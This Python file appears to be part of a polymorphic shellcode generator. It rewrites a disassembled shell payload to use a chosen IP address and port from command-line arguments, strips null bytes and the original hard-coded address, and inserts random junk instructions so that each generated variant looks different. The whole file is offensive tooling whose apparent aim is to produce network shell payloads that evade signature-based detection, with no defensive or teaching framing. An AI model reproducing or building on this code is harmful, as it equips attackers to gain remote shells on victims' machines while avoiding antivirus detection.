import random
from utilityFuncs import getUnimpactfulInstructs, process_ip, process_port

# Code that generates new assembly instructions using specific addresses
def get_modified_instructions(listOfInstructs, random_label, reg, ip_address, port):
    # This will store the modified instructs that will be generated
    modifiedInstructs = []
    for instruct in listOfInstructs:
        if instruct.address == (0x1000 + 2):
            modifiedInstruct = "xor " + reg + "," + reg
        # adding randomness to populate the new shellcode
        elif instruct.address == (0x1000 + 4):
            if random.randint(1,5) == 3:
                modifiedInstruct = "mov " + reg + ",0" + getUnimpactfulInstructs()
            else:
                modifiedInstruct = "mov " + reg + ",0"
        elif instruct.address == (0x1000 + 13):
            modifiedInstruct = "push " + reg + getUnimpactfulInstructs()
        elif instruct.address == (0x1000 + 14):
            modifiedInstruct = "push " + reg + getUnimpactfulInstructs()

        # Fix null bytes that crash the code when pushing a word (have to precise that we are pushing a word by pushing only AX) 0x5c11 instead of 0x00005c11 and dynamically set the port from CLI arg
        elif instruct.address == (0x1000 + 28):
            modifiedInstruct = "xor eax,eax\nmov ax," + process_port(port)  + "\npush ax"
        elif instruct.address == (0x1000 + 32):
            modifiedInstruct = "xor eax,eax\nmov al,2\npush ax"

        # Dynamically set the IP from CLI arg
        elif instruct.address == 0x1000 + 15:
            modifiedInstruct = process_ip(ip_address)

        # Remove the original code hardcoded IP
        elif instruct.address == 0x1000 + 20:
            modifiedInstruct = ""
        elif instruct.address == 0x1000 + 25:
            modifiedInstruct = ""
        elif instruct.address == 0x1000 + 27:
            modifiedInstruct = ""

        # =========== MANDATORY ========================

        # Add a label for the loop instruction to be able to reassemble the code
        elif instruct.address == (0x1000 + 67):
            modifiedInstruct = random_label + ":\n" + instruct.mnemonic + ' ' + instruct.op_str
        elif instruct.address == (0x1000 + 75):
            modifiedInstruct = "loop " + random_label

        # For all other instructions just keep them the same
        else:
            modifiedInstruct = f"{instruct.mnemonic} {instruct.op_str}"
        modifiedInstructs.append(modifiedInstruct)

    return modifiedInstructs

